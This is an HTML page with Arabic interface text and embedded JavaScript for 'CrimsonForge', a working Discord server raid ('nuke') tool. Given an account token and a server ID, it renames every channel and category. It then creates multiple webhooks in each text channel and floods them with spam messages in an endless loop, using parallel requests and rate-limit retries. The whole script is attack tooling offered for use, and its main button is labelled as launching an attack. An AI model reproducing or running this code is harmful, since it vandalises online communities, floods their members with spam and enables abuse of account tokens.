<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CrimsonForge 🔥</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Cairo', sans-serif; background: #0a0000; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
    .bg-fire { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at 30% 40%, #3a0000, #0a0000 80%); z-index: -1; }
    .bg-fire::after { content: ''; position: absolute; width: 200%; height: 200%; top: -50%; left: -50%; background: repeating-conic-gradient(from 0deg, transparent 0deg, rgba(200, 0, 0, 0.05) 5deg, transparent 10deg); animation: rotateFire 40s linear infinite; }
    @keyframes rotateFire { to { transform: rotate(360deg); } }
    .glass-container { max-width: 750px; width: 100%; background: rgba(30, 5, 5, 0.85); backdrop-filter: blur(16px); border: 1px solid rgba(255, 50, 50, 0.25); border-radius: 32px; padding: 35px; box-shadow: 0 30px 70px rgba(200, 0, 0, 0.3); }
    h1 { font-size: 2.8rem; font-weight: 900; text-align: center; background: linear-gradient(135deg, #ffd700, #ff6a00); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
    .tagline { text-align: center; color: #ff8888; font-weight: 700; margin-bottom: 25px; }
    .risk-check { background: rgba(255, 0, 0, 0.1); border: 1px solid rgba(255, 50, 50, 0.3); border-radius: 12px; padding: 12px 15px; margin-bottom: 20px; display: flex; align-items: center; gap: 12px; }
    .risk-check input { width: 20px; height: 20px; accent-color: #ff3333; }
    .risk-check label { color: #ffb0b0; font-weight: 600; cursor: pointer; }
    .input-group { margin-bottom: 16px; }
    .row { display: flex; gap: 15px; }
    .half { flex: 1; }
    label { display: block; font-weight: 700; font-size: 0.8rem; color: #ffb0b0; margin-bottom: 5px; }
    input, textarea { width: 100%; padding: 12px 16px; border-radius: 14px; border: 1px solid #3a1a1a; background: rgba(0, 0, 0, 0.5); color: #fff; font-size: 1rem; transition: 0.3s; }
    input:focus, textarea:focus { border-color: #ff3333; box-shadow: 0 0 25px rgba(255, 0, 0, 0.2); outline: none; background: #0a0000; }
    .actions { display: flex; gap: 12px; margin: 20px 0 15px; }
    #runBtn { flex: 1; padding: 14px; background: linear-gradient(135deg, #cc0000, #ff4500); border: none; border-radius: 16px; font-weight: 900; font-size: 1.2rem; color: #fff; cursor: pointer; transition: 0.3s; }
    #runBtn:hover:not(:disabled) { transform: scale(1.03); box-shadow: 0 0 40px rgba(255, 0, 0, 0.5); }
    #runBtn:disabled { opacity: 0.4; cursor: not-allowed; }
    #stopBtn { background: #550000; border: 1px solid #aa0000; border-radius: 16px; font-weight: 900; color: #ffaaaa; padding: 0 25px; cursor: pointer; }
    .progress-wrap { width: 100%; height: 8px; background: #1a0a0a; border-radius: 10px; overflow: hidden; margin-top: 10px; border: 1px solid #3a0a0a; }
    #progressBar { height: 100%; width: 0%; background: linear-gradient(90deg, #ff0040, #ff8000); border-radius: 10px; transition: width 0.3s ease; }
    #progressText { text-align: center; font-size: 0.8rem; color: #ff9999; margin-top: 4px; }
    .stats { display: flex; justify-content: space-around; background: rgba(20, 0, 0, 0.5); border-radius: 16px; padding: 12px; margin: 15px 0; border: 1px solid #2a0a0a; }
    .stats div { color: #ffbbbb; font-weight: 700; }
    .stats span { font-weight: 900; color: #ffd700; font-size: 1.4rem; }
    #logArea { margin-top: 20px; background: rgba(0, 0, 0, 0.6); border-radius: 16px; padding: 15px; border: 1px solid #2a0a0a; }
    #logArea h3 { color: #ff8888; }
    #logs { max-height: 200px; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; color: #ffd0d0; background: #0a0000; padding: 10px; border-radius: 10px; white-space: pre-wrap; line-height: 1.6; }
    #logs .error { color: #ff4444; }
    #logs .success { color: #66ff66; }
    footer { margin-top: 20px; text-align: center; color: #663333; border-top: 1px solid #1a0505; padding-top: 15px; }
    #status { color: #ff6666; font-weight: 700; }
  </style>
</head>
<body>
  <div class="bg-fire"></div>
  <div class="glass-container">
    <header><h1>🔥 CrimsonForge</h1><p class="tagline">سيطرة القرمزي · هيبة لا تُقهر</p></header>
    <form id="discordForm">
      <div class="risk-check">
        <input type="checkbox" id="riskAgree" required />
        <label for="riskAgree">أقرّ بتحملي المسؤولية الكاملة عن استخدام هذا التوكن</label>
      </div>
      <div class="input-group"><label>🗝️ توكن الحساب (Token)</label><input type="password" id="token" placeholder="أدخل التوكن" required /></div>
      <div class="input-group"><label>🆔 آيدي السيرفر (Guild ID)</label><input type="text" id="guildId" placeholder="مثال: 123456789012345678" required /></div>
      <div class="row">
        <div class="input-group half"><label>📛 اسم الويب هوك</label><input type="text" id="webhookName" value="Crimson" /></div>
        <div class="input-group half"><label>🔢 ويب هوك لكل قناة</label><input type="number" id="webhooksPerRoom" value="5" min="1" max="10" /></div>
      </div>
      <div class="row">
        <div class="input-group half"><label>📁 اسم القنوات الجديد</label><input type="text" id="newRoomName" value="CRIMSON" /></div>
        <div class="input-group half"><label>📁 اسم الفئات الجديد</label><input type="text" id="newCategoryName" value="CRIMSON-CAT" /></div>
      </div>
      <div class="input-group"><label>✉️ رسالة السبام (لانهائي حتى الإيقاف)</label><textarea id="spamMessage" rows="2">CrimsonForge 🔥</textarea></div>
      <div class="actions">
        <button type="submit" id="runBtn">🚀 تشغيل الهجوم</button>
        <button type="button" id="stopBtn">⏹️ إيقاف</button>
      </div>
      <div class="progress-wrap"><div id="progressBar" style="width: 0%;"></div></div>
      <div id="progressText">0%</div>
    </form>
    <div class="stats">
      <div>📊 <span id="statChannels">0</span> قناة/فئة</div>
      <div>🔗 <span id="statWebhooks">0</span> ويب هوك</div>
      <div>✉️ <span id="statMessages">0</span> رسالة</div>
    </div>
    <div id="logArea"><h3>📋 سجل العمليات القرمزية</h3><div id="logs"></div></div>
    <footer>صنع بـ ❤️ 🔥 · <span id="status">⏳ جاهز للانطلاق</span></footer>
  </div>

  <script>
    let stopFlag = false, stats = { channels: 0, webhooks: 0, messages: 0 };
    const PROXY_URL = '/api/proxy';

    function updateStats() {
      document.getElementById('statChannels').textContent = stats.channels;
      document.getElementById('statWebhooks').textContent = stats.webhooks;
      document.getElementById('statMessages').textContent = stats.messages;
    }
    function setProgress(pct) {
      document.getElementById('progressBar').style.width = Math.min(pct, 100) + '%';
      document.getElementById('progressText').textContent = Math.round(pct) + '%';
    }
    function addLog(msg, type = '') {
      const logDiv = document.getElementById('logs');
      const line = document.createElement('div');
      line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
      if (type) line.className = type;
      logDiv.appendChild(line);
      logDiv.scrollTop = logDiv.scrollHeight;
    }

    document.getElementById('stopBtn').addEventListener('click', () => { 
      stopFlag = true; 
      addLog('⏹️ أمر الإيقاف...', 'warn'); 
    });

    // دالة ذكية للتعامل مع Rate Limits مع إعادة المحاولة التلقائية
    async function smartFetch(url, options = {}, retries = 5) {
      for (let attempt = 0; attempt < retries; attempt++) {
        try {
          const response = await fetch(PROXY_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              url: url,
              method: options.method || 'GET',
              headers: options.headers || {},
              body: options.body ? JSON.parse(options.body) : undefined
            })
          });
          
          if (response.status === 429) {
            const retryAfter = parseInt(response.headers.get('retry-after')) || 3;
            addLog(`⏳ Rate Limit - انتظار ${retryAfter} ثانية...`, 'warn');
            await delay(retryAfter * 1000 + 500);
            continue;
          }
          
          if (!response.ok) {
            const err = await response.json();
            throw new Error(err.error || `HTTP ${response.status}`);
          }
          return await response.json();
        } catch (err) {
          if (attempt === retries - 1) throw err;
          await delay(1000);
        }
      }
    }

    // دالة لتنفيذ مهام متوازية مع تحديد عدد التزامن
    async function parallelExecute(tasks, concurrency = 10) {
      const results = [];
      const executing = [];
      for (const task of tasks) {
        const p = task().then(result => results.push(result));
        executing.push(p);
        if (executing.length >= concurrency) {
          await Promise.race(executing);
          // نزيل المهام المنتهية
          for (let i = executing.length - 1; i >= 0; i--) {
            if (executing[i].isSettled) {
              executing.splice(i, 1);
            }
          }
        }
      }
      await Promise.allSettled(executing);
      return results;
    }

    document.getElementById('discordForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      stopFlag = false;
      stats = { channels: 0, webhooks: 0, messages: 0 };
      updateStats(); setProgress(0);

      if (!document.getElementById('riskAgree').checked) { addLog('❌ وافق على المخاطر أولاً!', 'error'); return; }

      const token = document.getElementById('token').value.trim();
      const guildId = document.getElementById('guildId').value.trim();
      const webhookName = document.getElementById('webhookName').value.trim() || 'Crimson';
      const webhooksPerRoom = parseInt(document.getElementById('webhooksPerRoom').value) || 5;
      const spamMessage = document.getElementById('spamMessage').value || 'CrimsonForge 🔥';
      const newRoomName = document.getElementById('newRoomName').value.trim() || 'CRIMSON';
      const newCategoryName = document.getElementById('newCategoryName').value.trim() || 'CRIMSON-CAT';

      if (!token || !guildId) { addLog('❌ أدخل التوكن وآيدي السيرفر', 'error'); return; }

      const runBtn = document.getElementById('runBtn');
      runBtn.disabled = true; runBtn.textContent = '⚡ جارٍ التنفيذ...';
      document.getElementById('status').textContent = '🔥 مشتعل...';
      document.getElementById('logs').innerHTML = '';
      addLog('🚀 بدء الهجوم الخرافي (سرعة فائقة + ذكاء)...');

      try {
        // 1. جلب جميع القنوات
        const channels = await smartFetch(`https://discord.com/api/v10/guilds/${guildId}/channels`, {
          headers: { Authorization: token }
        });
        
        const allChannels = channels.filter(c => c.type === 0 || c.type === 2 || c.type === 4);
        const textChannels = channels.filter(c => c.type === 0);
        
        stats.channels = allChannels.length; 
        updateStats();
        if (allChannels.length === 0) { addLog('⚠️ لا توجد قنوات!', 'warn'); return; }
        addLog(`✅ تم العثور على ${allChannels.length} قناة/فئة (نصي: ${textChannels.length}).`);

        // 2. تغيير أسماء جميع القنوات بسرعة خرافية (دفعات متوازية)
        addLog('⚡ تغيير أسماء جميع القنوات والفئات بسرعة فائقة...');
        const renameTasks = allChannels.map(ch => async () => {
          if (stopFlag) return;
          try {
            let newName = newRoomName;
            if (ch.type === 4) newName = newCategoryName;
            await smartFetch(`https://discord.com/api/v10/channels/${ch.id}`, {
              method: 'PATCH',
              headers: { Authorization: token, 'Content-Type': 'application/json' },
              body: JSON.stringify({ name: newName })
            });
          } catch (err) { /* نتجاوز */ }
        });
        
        // ننفذ 15 طلب تغيير في نفس الوقت
        await parallelExecute(renameTasks, 15);
        addLog('✅ تم تغيير أسماء جميع القنوات والفئات!', 'success');
        setProgress(30);

        // 3. إنشاء ويب هوكات في كل قناة نصية (جميعها) بسرعة خرافية
        addLog(`⚡ إنشاء ${webhooksPerRoom} ويب هوك في كل قناة نصية (${textChannels.length} قناة)...`);
        const allUrls = [];
        const webhookTasks = [];
        
        for (const ch of textChannels) {
          for (let i = 0; i < webhooksPerRoom; i++) {
            if (stopFlag) break;
            const task = async () => {
              try {
                const data = await smartFetch(`https://discord.com/api/v10/channels/${ch.id}/webhooks`, {
                  method: 'POST',
                  headers: { Authorization: token, 'Content-Type': 'application/json' },
                  body: JSON.stringify({ name: webhookName })
                });
                const url = `https://discord.com/api/webhooks/${data.id}/${data.token}`;
                allUrls.push(url);
                stats.webhooks++; 
                updateStats();
                return url;
              } catch (err) {
                return null;
              }
            };
            webhookTasks.push(task);
          }
        }
        
        // ننشئ 20 ويب هوك في نفس الوقت (سرعة خرافية)
        await parallelExecute(webhookTasks, 20);
        setProgress(70);
        addLog(`✅ تم إنشاء ${allUrls.length} ويب هوك في جميع القنوات النصية.`, 'success');

        if (allUrls.length === 0) { addLog('⚠️ لم يتم إنشاء أي ويب هوك! لا يمكن السبام.', 'warn'); return; }
        
        // نعرض إحصائيات الويب هوكات لكل قناة
        addLog(`📊 متوسط الويب هوكات لكل قناة: ${(allUrls.length / textChannels.length).toFixed(1)}`, 'success');
        addLog('🔥 بدء السبام اللانهائي الخرافي... اضغط "إيقاف" للتوقف.', 'success');

        // 4. السبام اللانهائي مع أقصى سرعة (10 طلبات متوازية)
        let round = 1;
        while (!stopFlag) {
          // نأخذ عينة من 20 ويب هوك لكل دفعة (أو كلهم لو أقل)
          const batchSize = Math.min(20, allUrls.length);
          const batch = allUrls.slice(0, batchSize);
          
          const spamTasks = batch.map(url => async () => {
            if (stopFlag) return;
            try {
              await smartFetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: spamMessage })
              });
              stats.messages++; 
              updateStats();
            } catch (err) { /* نتجاوز */ }
          });
          
          // نرسل 10 رسائل متوازية في كل دفعة
          await parallelExecute(spamTasks, 10);
          
          if (!stopFlag) {
            // نرسل تقرير كل 5 جولات فقط لتجنب الزحمة في السجل
            if (round % 5 === 0) {
              addLog(`📩 اكتملت الجولة ${round} (إجمالي رسائل: ${stats.messages})`, 'success');
            }
            round++;
            setProgress(70 + (Math.min(round, 300) / 300) * 25);
          }
          
          // تأخير بسيط جداً بين الدفعات (25 ميللي فقط)
          await delay(25);
        }

        setProgress(100);
        addLog(`⏹️ تم إيقاف السبام بعد ${round-1} جولة و ${stats.messages} رسالة.`, 'warn');
        document.getElementById('status').textContent = '⏹️ متوقف';

      } catch (err) {
        addLog(`💥 خطأ: ${err.message}`, 'error');
        document.getElementById('status').textContent = '❌ فشل';
        setProgress(0);
      } finally {
        runBtn.disabled = false; 
        runBtn.textContent = '🚀 تشغيل الهجوم';
        if (!stopFlag && document.getElementById('status').textContent !== '⏹️ متوقف') {
          document.getElementById('status').textContent = '⏳ جاهز';
        }
        stopFlag = false;
      }
    });

    function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
  </script>
</body>
</html>
